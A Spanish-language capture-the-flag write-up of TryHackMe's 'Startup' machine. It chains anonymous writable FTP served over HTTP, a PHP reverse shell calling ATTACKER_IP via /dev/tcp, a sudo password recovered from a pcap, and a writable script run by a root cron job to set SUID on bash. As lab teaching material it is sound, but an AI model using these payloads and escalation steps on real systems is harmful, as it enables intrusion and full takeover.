Startup es una máquina Linux Easy de TryHackMe que encadena tres hallazgos hasta un compromiso completo. El FTP anónimo expone un directorio con escritura para todos que, además, resulta estar publicado por HTTP, así que una reverse shell PHP escrita por FTP puede dispararse desde el navegador como `www-data`. Una captura de red olvidada en el sistema de ficheros guarda una sesión de shell grabada cuya contraseña de `sudo` tecleada pertenece al usuario `lennie`, y un cron de root ejecuta un script que `lennie` puede reescribir — convirtiendo a ese usuario en root.

Una nota sobre el direccionamiento: la máquina se reinició a mitad, así que su IP cambió. Todos los comandos de abajo usan la dirección que estuvo activa el resto de la sesión, `10.130.130.132`.

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV -Pn -n 10.130.130.132 -oN nmap
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

Tres servicios, y los scripts de FTP de nmap ya han hecho el trabajo más importante: el **FTP anónimo está permitido**, y uno de los directorios del share —`ftp`— está marcado como **writeable**. Un share anónimo con escritura es solo medio foothold por sí solo; la otra mitad es encontrar dónde se ejecutan esos ficheros.

### FTP — Acceso Anónimo

Entrando como `anonymous`/`ftp` se confirma la estructura, incluido un `notice.txt` que es puro sabor (una queja de oficina sobre memes de "Among Us") y el subdirectorio `ftp/` con escritura:

```bash
ftp 10.130.130.132       # nombre: ftp,  contraseña: <en blanco>
```

```bash
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

### Enumeración Web — El Share `/files/`

La web es un placeholder de "Maintenance", pero un escaneo de contenido encuentra un directorio que lo cambia todo:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.130.132/ -t 50
```

```bash
files                (Status: 301) [--> http://10.130.130.132/files/]
server-status        (Status: 403)
```

Al navegar `/files/` aparecen el *mismo* `important.jpg` y `notice.txt` vistos por FTP: **el share FTP se sirve por HTTP**. Ese es todo el foothold — el directorio `ftp/` con escritura es alcanzable en `http://10.130.130.132/files/ftp/`, y como el sitio corre PHP, un script escrito ahí a través de FTP se ejecutará al pedirlo por la web.

## Acceso Inicial — Webshell por el Share FTP como `www-data`

El payload es un fichero PHP que dispara una reverse shell en cuanto se carga — sin parámetro `cmd`, ya que controlamos el fichero entero:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"); ?>
```

Sube por FTP al directorio `ftp/` con escritura:

```bash
ftp> cd ftp
ftp> put shell.php
```

Con un listener preparado, pedir el fichero por HTTP lo ejecuta:

```bash
curl http://10.130.130.132/files/ftp/shell.php
```

```bash
nc -nlvp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.130.130.132 35260
www-data@startup:/var/www/html/files/ftp$
```

Tras el habitual tratamiento de la TTY, un vistazo alrededor muestra un solo directorio home, `lennie`, y una carpeta `/incidents/` propiedad de root que guarda una captura de red — algo raro de dejar tirado en un servidor web:

```bash
www-data@startup:/incidents$ ls -la
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

## Movimiento Lateral — `www-data` → `lennie`

### Exfiltrando la Captura

La captura no se puede abrir en la máquina, así que vuelve por donde entró la shell — copiada al directorio `ftp/` alcanzable por web y descargada con `wget`:

```bash
www-data@startup:/incidents$ cp suspicious.pcapng /var/www/html/files/ftp/
```

```bash
wget http://10.130.130.132/files/ftp/suspicious.pcapng
```

### Siguiendo el Flujo TCP

Abierta en Wireshark, la captura guarda una sesión interactiva grabada — la shell de otra persona en este host. **Follow TCP Stream** la reensambla en una transcripción legible de todo lo que tecleó:

![El Follow TCP Stream de Wireshark reconstruyendo una sesión de shell grabada en el objetivo](/assets/img/THM/Startup/cap1.png)

A mitad, el usuario ejecuta un comando `sudo` y teclea su contraseña en el prompt — capturada en texto claro porque la propia sesión era en texto plano:

![El flujo reconstruido mostrando al usuario introduciendo una contraseña de sudo, c4ntg3t3n0ughsp1c3](/assets/img/THM/Startup/cap2.png)

La contraseña `c4ntg3t3n0ughsp1c3` merece probarse contra el único usuario real de la máquina, `lennie`, y está reutilizada ahí:

```bash
www-data@startup:/incidents$ su lennie
Password:
lennie@startup:~$ cat user.txt
REDACTED
```

## Escalada de Privilegios — `lennie` → `root`

El home de `lennie` tiene un directorio `scripts/` propiedad de `root`, que contiene un `planner.sh` y un `startup_list.txt` cuya marca de tiempo se sigue actualizando — la firma de algo que corre en un horario:

```bash
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`planner.sh` es propiedad de root, pero *llama* a `/etc/print.sh` — y ese fichero es propiedad de `lennie`:

```bash
lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

Si un cron de root ejecuta `planner.sh`, entonces lo que contenga `/etc/print.sh` también corre como root — y `lennie` puede escribirlo. Añadir una línea que ponga el bit SUID en `/bin/bash` y esperar a que el trabajo se dispare hace exactamente eso:

```bash
lennie@startup:~/scripts$ echo "chmod u+s /bin/bash" >> /etc/print.sh
lennie@startup:~/scripts$ watch -n 1 "ls -l /bin/bash"
```

```bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

Una vez `/bin/bash` es SUID-root, `bash -p` mantiene ese privilegio en vez de soltarlo, y la máquina está resuelta:

```bash
lennie@startup:~$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
REDACTED
```

## Conclusiones Clave

- **Un share con escritura es peligroso en cuanto sus ficheros son ejecutables en algún sitio.** El acceso de escritura por FTP era inofensivo hasta que `/files/` demostró que el mismo directorio lo servía —e interpretaba— el servidor web. Subir-por-un-protocolo, ejecutar-por-otro es un patrón recurrente; el arreglo es mantener el almacenamiento de subidas fuera de cualquier ruta desde la que un servidor ejecute código.
- **Las capturas de red son almacenes de credenciales.** Una sesión en texto plano grabada a disco reprodujo cada pulsación, contraseña de `sudo` incluida. Artefactos sensibles como los `.pcap` dejados en un sistema alcanzable valen tanto como un fichero de contraseñas — y una contraseña reutilizada convirtió una curiosidad forense en un login.
- **Marcas de tiempo que cambian solas significan que algo corre en un horario.** Que `startup_list.txt` se actualizara solo fue la pista de un cron, sin necesidad de leer `/etc/crontab` — el comportamiento suele ser más fácil de observar que la configuración.
- **Un trabajo de root es tan de fiar como cada fichero que toca.** `planner.sh` era seguro y propiedad de root, pero invocaba un script escribible por `lennie`; el privilegio de una tarea programada fluye a *todo lo que hay en su cadena de llamadas*, y un solo eslabón escribible basta.
- **La escalada clásica de SUID-bash necesita `-p`.** Poner el bit SUID es la mitad; `bash -p` es la otra mitad, manteniendo el UID efectivo de root que un arranque de shell normal soltaría de inmediato.
